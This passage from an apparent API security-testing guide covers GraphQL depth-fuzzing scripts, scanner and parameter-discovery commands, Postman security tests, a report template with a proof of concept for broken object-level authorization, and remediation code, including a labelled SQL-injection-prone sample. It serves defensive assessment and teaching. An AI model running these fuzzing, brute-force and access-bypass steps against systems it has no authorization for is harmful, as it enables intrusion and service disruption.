                    r = requests.post(endpoint, json=test_query)
                    if r.status_code != 200 or 'error' in r.text.lower():
                        print(f"Potential issue: {field['name']} with {edge}")
                        print(r.text[:200])
```

**Query Depth Fuzzing**:
```python
def generate_deep_query(depth):
    """Generate deeply nested queries to test resource limits"""
    query = "query DeepTest {"
    for i in range(depth):
        query += f"  level{i}: user(id: \"{i}\") {{"
        query += "    friends {"
    query += "      name"
    for i in range(depth):
        query += "    }"
        query += "  }"
    query += "}"
    return query

# Test various depths
for depth in [5, 10, 20, 50, 100, 200]:
    query = generate_deep_query(depth)
    r = requests.post(endpoint, json={"query": query})
    print(f"Depth {depth}: Status {r.status_code}, Time: {r.elapsed.total_seconds()}s")
```

### Automated Security Scanning

**OWASP ZAP API Scan**:
```bash
# Run ZAP API scan
docker run -t owasp/zap2docker-stable zap-api-scan.py \
    -t https://api.target.com/openapi.json \
    -f openapi \
    -r zap_report.html \
    -J zap_report.json \
    -w zap_report.md \
    -a

# Authenticated scan
docker run -t owasp/zap2docker-stable zap-api-scan.py \
    -t https://api.target.com/openapi.json \
    -f openapi \
    -r zap_report.html \
    --auth_header "Authorization: Bearer TOKEN"
```

**Burp Suite API Scanning**:
```bash
# Using Burp's REST API for automation
curl -X POST \
     -H "Authorization: BURP_API_KEY" \
     -d '{"urls":["https://api.target.com"]}' \
     http://localhost:1337/v0.1/scan
```

**Kiterunner API Discovery and Scanning**:
```bash
# Compile Kiterunner
kr scan https://api.target.com \
    -w ~/routes/kiterunner/routes-large.kite \
    -x 20 \
    -o json \
    -d 5

# Scan with wordlist
kr brute https://api.target.com \
    -w /usr/share/seclists/Discovery/Web-Content/api-endpoints.txt \
    -x 20 \
    -d 3
```

---

## API Security Testing Tools

A comprehensive API security testing toolkit includes various specialized tools for different testing scenarios.

### Burp Suite Extensions

**Install and Configure Extensions**:
```
1. Burp -> Extender -> BApp Store
2. Install the following extensions:
   - Autorize (authentication bypass detection)
   - JWT4B (JWT manipulation)
   - JSON Beautifier
   - Content-Type Converter
   - GraphQL Raider
   - OpenAPI Parser
   - Backslash Powered Scanner
```

**Using Autorize for Authorization Testing**:
```
1. Configure Autorize with low-privilege user token
2. Browse application with high-privilege user
3. Autorace automatically compares responses
4. Analyze color-coded results:
   - Green: Properly enforced
   - Orange: Status code bypass
   - Red: Vulnerability detected
```

### Postman for API Testing

**Collection Setup for Security Testing**:
```json
{
  "info": {
    "name": "API Security Tests",
    "description": "Security test collection"
  },
  "item": [
    {
      "name": "Authentication Tests",
      "item": [
        {
          "name": "No Auth Test",
          "request": {
            "method": "GET",
            "header": [],
            "url": "{{base_url}}/admin"
          }
        },
        {
          "name": "Invalid Token Test",
          "request": {
            "method": "GET",
            "header": [
              {
                "key": "Authorization",
                "value": "Bearer invalid_token"
              }
            ],
            "url": "{{base_url}}/protected"
          }
        }
      ]
    }
  ],
  "variable": [
    {
      "key": "base_url",
      "value": "https://api.target.com/v1"
    }
  ]
}
```

**Postman Tests for Security Validation**:
```javascript
// Test for information disclosure in error messages
pm.test("No sensitive data in error", function () {
    pm.expect(pm.response.text()).to.not.include("password");
    pm.expect(pm.response.text()).to.not.include("secret");
    pm.expect(pm.response.text()).to.not.include("sql");
});

// Test for proper CORS headers
pm.test("CORS properly configured", function () {
    pm.response.to.have.header("Access-Control-Allow-Origin");
    pm.expect(pm.response.headers.get("Access-Control-Allow-Origin")).to.not.equal("*");
});

// Test for security headers
pm.test("Security headers present", function () {
    pm.response.to.have.header("X-Content-Type-Options");
    pm.response.to.have.header("X-Frame-Options");
});
```

### Specialized API Security Tools

**Arjun - HTTP Parameter Discovery**:
```bash
# Install Arjun
pip install arjun

# Discover parameters
arjun -u https://api.target.com/v1/users -m POST
arjun -u https://api.target.com/v1/search -m GET

# Use custom wordlist
arjun -u https://api.target.com/v1/data -m POST \
      -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
```

**httpie for API Interaction**:
```bash
# Install httpie
pip install httpie

# Make authenticated requests
http GET api.target.com/v1/users Authorization:"Bearer TOKEN"

# POST with JSON
http POST api.target.com/v1/users name="Test" email="test@test.com"

# Session handling
http --session=logged-in POST api.target.com/v1/login username=test password=test
http --session=logged-in GET api.target.com/v1/profile
```

**RESTler - Stateful REST API Fuzzing**:
```bash
# Compile RESTler
python3 -m pip install restler

# Generate grammar from OpenAPI spec
python3 -m restler.compile --api_spec api.json --output_dir ./compile

# Fuzz the API
python3 -m restler.fuzz --grammar_file ./compile/grammar.json \
                        --dictionary_file ./compile/dict.json \
                        --target_url https://api.target.com \
                        --time_budget 1
```

**Schemathesis - Property-Based Testing**:
```bash
# Install schemathesis
pip install schemathesis

# Test from OpenAPI spec
st run --base-url https://api.target.com \
       --checks all \
       --hypothesis-deadline 5000 \
       api.json

# With authentication
st run --base-url https://api.target.com \
       -H "Authorization: Bearer TOKEN" \
       --checks all \
       api.json

# State-machine testing for stateful APIs
st run --base-url https://api.target.com \
       --stateful=links \
       api.json
```

### API Testing Automation

**CI/CD Integration**:
```yaml
# .github/workflows/api-security.yml
name: API Security Tests

on: [push, pull_request]

jobs:
  security-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      
      - name: Run API Fuzzing
        run: |
          docker run --rm -v $(pwd):/results \
            owasp/zap2docker-stable zap-api-scan.py \
            -t https://api.staging.target.com/openapi.json \
            -f openapi \
            -J /results/zap-results.json
      
      - name: Run Schemathesis
        run: |
          pip install schemathesis
          st run --base-url https://api.staging.target.com \
                 --junit-xml results.xml \
                 openapi.json
```

---

## Reporting and Remediation

Effective API security testing culminates in clear, actionable reports that enable developers to remediate identified vulnerabilities.

### Vulnerability Classification

**OWASP API Security Top 10 2023 Mapping**:
1. **API1:2023 - Broken Object Level Authorization** (BOLA)
2. **API2:2023 - Broken Authentication**
3. **API3:2023 - Broken Object Property Level Authorization**
4. **API4:2023 - Unrestricted Resource Consumption**
5. **API5:2023 - Broken Function Level Authorization** (BFLA)
6. **API6:2023 - Unrestricted Access to Sensitive Business Flows**
7. **API7:2023 - Server Side Request Forgery**
8. **API8:2023 - Security Misconfiguration**
9. **API9:2023 - Improper Inventory Management**
10. **API10:2023 - Unsafe Consumption of APIs**

### Report Structure

**Executive Summary**:
```markdown
# API Security Assessment Report

## Executive Summary
This report documents the findings of a comprehensive security assessment of [Target] APIs conducted from [Start Date] to [End Date]. The assessment identified [X] vulnerabilities, including [Y] critical and [Z] high-severity issues requiring immediate attention.

### Risk Rating Summary
| Severity | Count | Status |
|----------|-------|--------|
| Critical | 2 | Unresolved |
| High | 5 | Unresolved |
| Medium | 8 | Unresolved |
| Low | 12 | Unresolved |
| Info | 15 | Unresolved |
```

**Technical Findings Template**:
```markdown
### Finding: [Vulnerability Name]
**Severity**: [Critical/High/Medium/Low/Info]
**OWASP Category**: [API1:2023 - BOLA]
**Affected Endpoints**: 
- /api/v1/users/{id}
- /api/v1/orders/{id}

#### Description
[Detailed description of the vulnerability]

#### Proof of Concept
```bash
# Step 1: Authenticate as regular user
curl -X POST https://api.target.com/v1/login \
  -d '{"username":"user","password":"pass"}'

# Step 2: Access another user's data
curl -H "Authorization: Bearer [TOKEN]" \
  https://api.target.com/v1/users/124/profile
```

#### Impact
[Description of business impact]

#### Remediation
[Specific steps to fix the issue]

#### References
- [OWASP Cheat Sheet]
- [CWE Entry]
```

### Remediation Guidance

**BOLA/IDOR Remediation**:
```python
# Vulnerable code
def get_user(user_id):
    return db.query(f"SELECT * FROM users WHERE id = {user_id}")

# Secure implementation
def get_user_secure(user_id, current_user):
    user = db.query(User).filter_by(id=user_id).first()
    if not user:
        abort(404)
    if user.id != current_user.id and not current_user.is_admin:
        abort(403)
    return user
```

**Rate Limiting Implementation**:
```python
# Flask-Limiter example
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(
    app,
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"]
)

@app.route("/api/v1/login", methods=["POST"])
@limiter.limit("5 per minute")
def login():
    # Login logic
    pass

@app.route("/api/v1/users/<id>")
@limiter.limit("100 per minute")
def get_user(id):
    # User retrieval logic
    pass
```

**JWT Security Hardening**:
```python
import jwt
from datetime import datetime, timedelta

def generate_secure_token(user_id, role):
    payload = {
        'user_id': user_id,
        'role': role,
        'iat': datetime.utcnow(),
        'exp': datetime.utcnow() + timedelta(hours=1),
        'jti': generate_unique_id(),  # JWT ID for revocation
        'iss': 'api.target.com',
        'aud': 'target.com'
    }
    
    return jwt.encode(
        payload,
        SECRET_KEY,
        algorithm='HS256'  # Use RS256 for asymmetric signing
    )

def verify_token(token):
    try:
        payload = jwt.decode(
            token,
            SECRET_KEY,
            algorithms=['HS256'],
            issuer='api.target.com',
            audience='target.com'
        )
        
        # Check if token is revoked
        if is_revoked(payload['jti']):
            raise jwt.InvalidTokenError('Token has been revoked')
            
        return payload
    except jwt.ExpiredSignatureError:
        raise jwt.InvalidTokenError('Token has expired')
    except jwt.InvalidTokenError:
        raise jwt.InvalidTokenError('Invalid token')
```

### Verification and Retesting

**Post-Remediation Verification**:
```bash
# Re-run all tests against fixed endpoints
curl -H "Authorization: Bearer [USER_TOKEN]" \
     https://api.target.com/v1/users/124/profile
# Expected: 403 Forbidden

# Verify rate limiting
for i in {1..10}; do
    curl -s -o /dev/null -w "%{http_code}\n" \
         https://api.target.com/v1/login \
         -X POST -d "username=test&password=test"
done
# Expected: 429 after limit reached

# Verify JWT security
# Attempt algorithm confusion attack
# Expected: Invalid algorithm error
```

This comprehensive guide to API security testing provides penetration testers with the knowledge and tools necessary to thoroughly assess modern API implementations. Continuous learning and adaptation to new attack vectors remain essential as API technologies evolve.
